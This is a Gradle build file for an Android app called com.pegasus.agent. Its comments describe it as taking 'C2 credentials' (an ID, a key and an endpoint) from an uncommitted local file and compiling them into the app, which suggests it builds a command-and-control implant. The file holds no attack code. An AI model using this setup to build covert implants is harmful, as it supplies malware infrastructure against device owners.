plugins {
    id 'com.android.application' version '8.5.0'
    id 'org.jetbrains.kotlin.android' version '1.9.24'
}

android {
    namespace 'com.pegasus.agent'
    compileSdk 34
    defaultConfig {
        // C2 credentials come from a local, uncommitted key.properties file
        // (~/.pegasus/key.properties on the build operator's machine) with the
        // exposed values treated as burned. Never commit the real secrets.
        def keyProps = new Properties()
        def keyPropsFile = new File(System.properties.getProperty("user.home"), ".pegasus/key.properties")
        if (keyPropsFile.exists()) {
            keyPropsFile.withInputStream { keyProps.load(it) }
        }
        def dna = keyProps.getProperty("dna", "00000000")
        def key = keyProps.getProperty("key", "")
        def endpoint = keyProps.getProperty("endpoint", "http://127.0.0.1:5002")
        buildConfigField "String", "DNA", "\"${dna}\""
        buildConfigField "String", "KEY", "\"${key}\""
        buildConfigField "String", "ENDPOINT", "\"${endpoint}\""
        applicationId "com.pegasus.agent"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }
    buildFeatures { buildConfig true }
    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
    kotlinOptions { jvmTarget = '1.8' }
}

dependencies {
    implementation 'androidx.core:core-ktx:1.12.0'
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'
    implementation 'dnsjava:dnsjava:3.5.3'
}
